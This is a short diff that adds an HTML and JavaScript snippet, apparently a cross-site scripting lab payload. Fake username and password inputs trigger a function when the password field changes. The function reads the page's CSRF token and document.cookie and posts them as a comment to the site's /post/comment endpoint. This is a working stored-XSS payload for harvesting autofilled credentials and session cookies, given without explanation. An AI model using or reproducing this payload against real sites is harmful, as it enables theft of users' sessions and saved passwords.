@@ -1,0 +1,22 @@
+
+<input name=username id=username>
+<input type=password name=password onchange="hax()">
+<script>
+    function hax(){
+        var token = document.getElementsByName('csrf')[0].value;
+        var data = new FormData();
+    
+        data.append('csrf', token);
+        data.append('postId', 9);
+        data.append('comment', document.cookie);
+        data.append('name', 'victim');
+        data.append('email', '0xyf@0xyf.local');
+        data.append('website', 'https://yufongg.github.io');
+    
+        fetch('/post/comment',{
+            method: 'POST',
+            mode: 'no-cors',
+            body: data
+        });
+    };
+</script>
